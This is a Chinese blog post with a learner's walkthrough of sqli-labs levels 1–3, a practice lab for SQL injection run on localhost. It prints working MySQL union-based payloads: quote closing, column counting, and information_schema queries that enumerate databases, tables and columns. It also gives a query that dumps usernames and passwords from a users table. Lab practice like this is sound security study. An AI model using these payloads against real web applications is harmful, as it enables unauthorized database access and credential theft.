---
title: sqil-labs摸坑历程
date: 2022-02-10 13:44:44
tags: 
cover: https://s2.loli.net/2022/02/08/mfnMdVakLjGXFYA.png
---
## 前言
又是被迫做Noob一天@@
==1==先摘抄一段学习大佬内容（仅以提醒自己知识点）
``mysql注入必懂的知识点
1）在mysql5.0版本以上中，存在一个自带数据库名information_schema自带 记录所有数据库名 表名 列名
2）数据库中符号“.”代表下一级，如user.user表示数据库user下的user表
3）information_schema.tables：记录所有表名信息的表
4）information_schema.columns：记录所有列名信息的表
5）table_schema：数据库名
6）table_name：表名
7）column_name：字段名
8）group_concat(table_name)：查询所有的表
9) 猜解多个数据：limit x，1 （变动x）
10）注释符：-- (后面有空格)(也就是–+) ，/**/ ,
payload结尾单引号闭合``
[原文链接：](https://blog.csdn.net/qq_53577336/article/details/118462999)
# less-1 ' 字符注入
**1：**根据提示，判断类型
id=1，正常
``id=1'``错误
``id=1'--+``页面回显正确
把1=1改成1=2，不报错也不显示任何信息，说明可以利用 ’ 字符注入
**可以判断了**：单引号字符注入
（==无泪==开始数据库没链接上？我说难道我的firefox和别人的不一样？^@^）
这里黄色字体是因为在Less-1脚本里加了个``echo $sql;``
![image.png](https://img-blog.csdnimg.cn/img_convert/bafc4969bbb0d13d01468c8fe2454a2b.png)
好的，接下来可以进行下一步
**2：**order by 表中列查询
![image.png](https://img-blog.csdnimg.cn/img_convert/e1ebd8247bb84c36690867e590400256.png)
==4==就查询不到了，应该有三列
**3：**查询一下数据库的显示位（如果显示位确定，只能通过这个显示位来显示查询数据？）
使用union select 1,2,3联合查询语句查看
![image.png](https://img-blog.csdnimg.cn/img_convert/55d91aec3e2f64570b8a2a5bf1f1a639.png)
说明页面有==2==个显示位
**4：** 利用sql查询语句爆破出数据库内的数据库西信息
?id=888' union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+
==数据库名查询语句==
![image.png](https://img-blog.csdnimg.cn/img_convert/c570336dc34d26f37455728f87da597e.png)
**5：**查询security内的所有表名
union select 1,(select group_concat(schema_name) from information_schema.schemata),(select group_concat(table_name) from information_schema.tables where table_schema='security')--+
![image.png](https://img-blog.csdnimg.cn/img_convert/866a1f0810c8502a5f7ab11d8f93d6ba.png)
**6：**爆破出列名
?id='union SELECT 1,2,(select group_concat(column_name) from information_schema.columns where table_name='users')%23
![image.png](https://img-blog.csdnimg.cn/img_convert/1dea6fe66312f77570f142bc450bf82c.png)
**7：** 爆破字段内容：``?id='union SELECT 1,2,(select group_concat(username,0x3a,password) from users)%23``
![image.png](https://img-blog.csdnimg.cn/img_convert/4e737b4c0e09e5fc6a79ef33340250d5.png)
0x3a就是一个:,用16进制表示了，为了区分一下账号和密码，增加可视化
# less-2  GET-Error based-intiger based（基于错误的GET整型注入）
**1:**整型数字可以直接查询，共有三个字段![image.png](https://img-blog.csdnimg.cn/img_convert/dcb1e73c93167a4bdc4e0f71aad79d76.png)
==Less1的爆破语句此处也都可以使用了==
**例子：**数据库名语句查询
``?id=-1 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+``
**注意：**id要写成’0‘或负数

![image.png](https://img-blog.csdnimg.cn/img_convert/f9af4f9027523805de8b5a1f1e4c5346.png)

# Less-3  GET-Error based-Single quotes with twist-string （基于错误的GET单引号变形字符型注入）
输入id=1测试，页面回显正常
输入id=1’测试，根据报错信息分析id格式
![image.png](https://img-blog.csdnimg.cn/img_convert/92cd4abcb20db9180b3605ce2f677307.png)
可以得知id格式为id=（‘1’），要有闭合括号和单引号

**数据库查名：**
``?id=-1 union select 1,(select group_concat(schema_name) from information_schema.schemata),3 --+``

![image.png](https://img-blog.csdnimg.cn/img_convert/f518ce623835e6f8842b29a7a5e4541e.png)
由此，由联合语句可以进行爆破了
``http://127.0.0.1/sqli-labs-master/Less-3/?id=-1') union select 1,group_concat(username),group_concat(password) from users order by id -- a``
![image.png](https://img-blog.csdnimg.cn/img_convert/b7ecf3afba9b7649ae4a84abe564191b.png)